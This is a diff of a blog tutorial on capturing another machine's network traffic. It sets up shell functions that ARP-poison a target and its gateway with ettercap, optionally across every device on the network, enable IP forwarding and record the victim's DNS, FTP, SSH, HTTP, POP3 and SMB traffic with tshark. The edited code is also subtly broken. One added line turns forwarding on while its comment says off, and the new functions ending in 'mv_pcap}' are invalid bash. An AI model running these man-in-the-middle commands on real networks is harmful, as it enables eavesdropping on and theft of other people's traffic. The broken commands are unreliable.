@@ -46,9 +46,9 @@ You can capture traffic through a network with a three-step process.
 
 -Creating command shortcuts with .bashrc
 
--Poisoning the arp tables on the router.
-
 -Forwarding the IP.
+
+-Poisoning the arp tables on the router.
 
 -capturing a copy of the TCP traffic flow with Wireshark.
 
@@ -82,7 +82,7 @@ We will start by creating a series of variables at the top of the document. Comm
 targetIP="192.168.1.100"
 myIP="192.168.1.4"
 gatewayIP="192.168.1.1"
-wifi="wlan0"
+adp="eth0"
 {% endhighlight %}
 
 If you don't know how to find all this information, then we will go through it step by step.
@@ -95,9 +95,7 @@ If you don't know how to find all this information, then we will go through it s
 
 <b>gatewayIP:</b> Normally it is something like 192.168.1.1. If you are using your Windows machine, type {% highlight ruby %}ipconfig{% endhighlight %} again and look for the line titled Default Gateway. If you want to know how to do this in Linux, type {% highlight ruby %}ip r{% endhighlight %}
 
-<b>eth:</b> Look at the ifconfig screenshot again. I highlighted eth0. This is my adapter name. The name is typically eth0 but you should double check.
-
-<b>wifi:</b> Same as eth. The only difference is that this is the wireless adapter name when you are NOT using a virtual machine. Leave it wlan0 for now, but be sure to double check if you are using Kali as your main system.
+<b>adp:</b> Look at the ifconfig screenshot again. I highlighted eth0. This is my adapter name. The name is typically eth0 but you should double check.
 
 Now that we have finished configuring the variables, we are going to add in some function commands. What are the functions? Let's break it down. The shortcut always will appear in the following format. function short() { long; }. The short is the shortened version of the actual command. The command itself is in between the { } space. Comments about the command referenced via #
 
@@ -113,6 +111,7 @@ function poison ()
 {
 sudo sysctl -w net.ipv4.ip_forward=1;
 sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//;
+sudo sysctl -w net.ipv4.ip_forward=1;
 }
 #sysctl: used to modify built in system varibles.
 #-w: used to specify a change in sysctl itself.
@@ -123,6 +122,8 @@ sudo ettercap -T -M arp:remote /$gatewayIP// /$targetIP//;
 #-M arp:remote: Tells ettercap to perform a "man in the middle attack" as discussed earlier in the article. We will tell it to use the arp attack to collect inbound and outbound traffic. As opposed to arp:oneway which only poisons the outbound traffic from the target.
 #/$gatewayIP// The first target. Redirecting all traffic from target1 to target2
 #/$gatewayIP// The second target.
+
+#sysctl: Same as the first but turns IP forwarding back off.
 {% endhighlight %}
 
 {% highlight ruby %}
@@ -130,6 +131,7 @@ function poison_all ()
 {
 sudo sysctl -w net.ipv4.ip_forward=1;
 sudo ettercap -T -M arp:remote /$gatewayIP// //;
+sudo sysctl -w net.ipv4.ip_forward=0;
 }
 #Same as above, but an unspecified target means, "collect all traffic going to and from the first targeted device"
 {% endhighlight %}
@@ -158,10 +160,6 @@ Save the file with Ctrl+O and confirm the changes. Press Ctrl+X to exit nano. Yo
 Open a new terminal window and run the following commands
 
 {% highlight ruby %}
-ip_forward_on
-{% endhighlight %}
-
-{% highlight ruby %}
 poison
 {% endhighlight %}
 
@@ -172,7 +170,7 @@ You should a bunch of random data flying through. This means it is working. In t
 With the net terminal tab open, we are going to capture the traffic and store it for later viewing. Wireshark is a wonderful tool for this. Wireshark is normally used as a graphical application, but one can only collect so much traffic with the graphical tool before running out of RAM. The target might be doing something you as the attacker would consider interesting. He might simultaneously be watching Youtube, uploading files to the cloud or even listening to a podcast. This amount of data that will have passed to and from his device will add up to something tremendous. You will want to limit the file size. Much like RAM, hard drive space is also a limited resource. You can save a file with a maximum file size limit. Once that limit is reached, then a new file is created. You can specify the maximum number of files you want to create. Once the limit has been reached, Wireshark will start deleting older files in order to make room for newer ones. For security reasons, we want to save these files to the /tmp/ directory, then copy them to our home directory when we are done. Now run the following.
 
 {% highlight ruby %}
-sudo tshark -i $eth -b filesize:8192 -a files:10 -w /tmp/capture.pcap
+sudo tshark -i $adp -b filesize:8192 -a files:10 -w /tmp/capture.pcap
 #tshark: Wireshark capture tool for command interfaces.
 #-i: Specify the interface. We are using our custom variable
 #-b: Limit the capture either by duration, filesize, or number of files. We will be using filesize. Filesize in KB, so 8192KB is 8MB. You can make them larger if you wish.
@@ -185,7 +183,7 @@ sudo tshark -i $eth -b filesize:8192 -a files:10 -w /tmp/capture.pcap
 While Wireshark is running, browse the internet with your target system. Take a break and do what you would normally do on the internet. Reframe from playing online games or streaming since this takes up a lot of space. I would suggest simply browsing the internet. After some time has passed, click the second terminal tab. Press Ctrl+C to stop the capture process if it hasn't stopped itself. Click on the first terminal tab. Press q in order to quit ettercap. Now run the following command to re-enable ip forwarding
 
 {% highlight ruby %}
-ip_forward_off
+sudo sysctl -w net.ipv4.ip_forward=0;
 {% endhighlight %}
 
 You will want to open the /tmp/ directory and move all the saved captures to your home directory. First edit the permissions, then use the move command
@@ -228,15 +226,15 @@ You will be able to see plenty of "DNS" packets. While web traffic is encrypted,
 Now that we have an idea of what the victim is using, we can set Wireshark to capture traffic by ports exclusively. This makes the file size smaller and easier to read. We are going to go back into our .bashrc file and add a few more lines.
 
 {% highlight ruby %}
-function tshark_dns() { sudo tshark -i $eth -f "port 53" -b filesize:8192 -a files:10 -w /tmp/capture_dns.pcap; }
+function tshark_dns() { sudo tshark -i $adp -f "port 53" -b filesize:8192 -a files:10 -w /tmp/capture_dns.pcap; }
 #same as the original tshark command but captures dns exclusivly
 #-f: Specify port. you can say things like "port 53 and port 80" if you wish to save multiple protocols in the same packet capture.
 #this particular function only captures dns traffic
-function tshark_ftp() { sudo tshark -i $eth -f "port 21" -b filesize:8192 -a files:10 -w /tmp/capture_ftp.pcap; }
-function tshark_ssh() { sudo tshark -i $eth -f "port 22" -b filesize:8192 -a files:10 -w /tmp/capture_ssh.pcap; }
-function tshark_http() { sudo tshark -i $eth -f "port 80" -b filesize:8192 -a files:10 -w /tmp/capture_ssh.pcap; }
-function tshark_pop3() { sudo tshark -i $eth -f "port 110" -b filesize:8192 -a files:10 -w /tmp/capture_pop3.pcap; }
-function tshark_smb() { sudo tshark -i $eth -f "port 445" -b filesize:8192 -a files:10 -w /tmp/capture_smb.pcap; }
+function tshark_ftp() { sudo tshark -i $adp -f "port 21" -b filesize:8192 -a files:10 -w /tmp/capture_ftp.pcap; sudo sysctl -w net.ipv4.ip_forward=0; mv_pcap}
+function tshark_ssh() { sudo tshark -i $adp -f "port 22" -b filesize:8192 -a files:10 -w /tmp/capture_ssh.pcap; sudo sysctl -w net.ipv4.ip_forward=0; mv_pcap}
+function tshark_http() { sudo tshark -i $adp -f "port 80" -b filesize:8192 -a files:10 -w /tmp/capture_http.pcap; sudo sysctl -w net.ipv4.ip_forward=0; mv_pcap}
+function tshark_pop3() { sudo tshark -i $adp -f "port 110" -b filesize:8192 -a files:10 -w /tmp/capture_pop3.pcap; sudo sysctl -w net.ipv4.ip_forward=0; mv_pcap}
+function tshark_smb() { sudo tshark -i $adp -f "port 445" -b filesize:8192 -a files:10 -w /tmp/capture_smb.pcap; sudo sysctl -w net.ipv4.ip_forward=0; mv_pcap}
 {% endhighlight %}
 
 Save and exit the terminal in order for changes to take effect. When you run Wireshark, you can open as many extra terminal windows as you like and capture as much filtered traffic as you deem necessary.
